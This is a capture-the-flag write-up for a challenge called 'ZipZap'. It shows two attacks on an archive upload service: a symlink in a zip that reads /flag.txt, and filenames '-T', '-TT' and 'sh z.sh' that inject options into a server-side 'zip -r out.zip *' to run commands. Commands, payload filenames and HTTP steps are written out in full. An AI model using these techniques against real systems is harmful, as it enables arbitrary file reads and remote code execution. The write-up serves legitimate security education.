# WS_1.03 — ZipZap

---

## Level 1 — Symlink Arbitrary File Read

### Analysis

When an archive is uploaded, the server extracts its contents and serves them via an endpoint or download link. If a zip file contains a symbolic link created with `zip --symlinks`, the link structure is preserved upon extraction. When the web application attempts to read or serve the extracted file, it follows the symlink and reads the file on the host filesystem (`/flag.txt`).

### Exploit

1. Create a local symbolic link pointing to `/flag.txt`:
   ```bash
   ln -s /flag.txt exploit_link
    ```

2. Compress the symlink ensuring the `--symlinks` flag preserves the link reference inside the archive:
```bash
zip --symlinks exploit.zip exploit_link
```


3. Upload `exploit.zip` to the web application.
4. Access the extracted link path via the web UI download endpoint (`GET /<id>/download/exploit_link`). The server follows the link and returns the contents of `/flag.txt` directly in the response body.

---

## Level 2 — Argument Injection via Crafted Filenames

### Analysis

In Level 2, the application allows uploading an archive, extracts it, and subsequently re-compresses the directory using a shell command with a wildcard expansion:

```bash
zip -r out.zip *
```

When the shell evaluates `*`, any filename starting with a hyphen `-` is interpreted as a command-line flag by `zip`.

By uploading an archive containing specially named files, we can inject options into the server's `zip` process:

* `-T`: Forces `zip` to test the integrity of the created archive.
* `-TT <cmd>`: Specifies a custom command to perform the integrity test instead of the default checker.

By supplying `-T`, `-TT`, and a filename containing the command payload, `zip` executes our arbitrary system command.

### Exploit

1. Prepare the exploit directory locally:
```bash
mkdir exploit && cd exploit
```


2. Create filenames that trigger argument injection (using `--` to prevent local shell commands from interpreting them as flags):
```bash
touch -- -T
touch -- -TT
touch "sh z.sh"
```


3. Create the payload shell script:
```bash
echo "/getflag > zz.txt" > z.sh

```


4. Compress the files into an archive:
```bash
zip -r ../exploit.zip ./*
cd ..
```


5. Upload `exploit.zip` to the target instance.
6. Trigger the zip rebuild action (e.g., via `GET /<id>/zip`). When `zip -r out.zip *` runs server-side, `*` expands into:
```
-T -TT "sh z.sh" z.sh
```


`zip` parses `-TT` and executes `sh z.sh`, which runs `/getflag` and redirects the output to `zz.txt`.
7. Retrieve the generated output file via `GET /<id>/download/zz.txt`.

---

## Exploitation with Insomnia

While constructing the zip files (`ln -s`, `touch -- -T`, etc.) must be performed in a local terminal, **Insomnia** can manage the HTTP workflow:

1. **Upload Archive (POST `/<id>/upload`):**
* Set request type to `Multipart Form`.
* Upload `exploit.zip` as a file field.


2. **Trigger Zip Step (GET `/<id>/zip`):**
* Triggers the re-zipping routine server-side (Level 2).


3. **Read Output (GET `/<id>/download/zz.txt` or `/exploit_link`):**
* Inspect the response body to extract the flag.



---

## Flag

```
CCIT{****************}
```

---

## What I Learned

* `zip --symlinks` retains symbolic link targets; applications that extract archives without validating link destinations expose local files to arbitrary reads.
* Wildcards (`*`) expanded by a shell pass filenames directly into command arguments. Filenames beginning with `-` will be interpreted as flags.
* Using `touch -- -T` is required when creating option-like filenames locally, as `--` instructs command line utilities to cease option parsing.
* The combination of `-T` and `-TT <cmd>` turns `zip` into an arbitrary command execution vector.